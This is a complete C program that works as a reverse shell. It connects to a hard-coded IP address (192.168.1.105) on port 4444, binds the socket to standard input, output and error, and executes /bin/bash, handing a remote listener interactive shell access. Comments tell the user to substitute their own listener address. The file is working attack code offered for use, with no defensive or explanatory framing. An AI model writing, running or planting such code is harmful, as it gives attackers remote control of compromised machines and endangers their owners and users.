#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main(void){
	int sock ; 
	//change port as ur listener 
	int port = 4444;
	struct sockaddr_in revsock ;
	sock = socket(AF_INET , SOCK_STREAM, 0);
	revsock.sin_family = AF_INET ; 
	revsock.sin_port = htons(port) ; 
	//change it to ur ip @ 
	revsock.sin_addr.s_addr = inet_addr("192.168.1.105") ;
	connect(sock, (struct sockaddr * )&revsock , sizeof(revsock));
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);
	char * const argv[] = {"/bin/bash",NULL};
	execve("/bin/bash",argv,NULL);
	return 0 ;
}
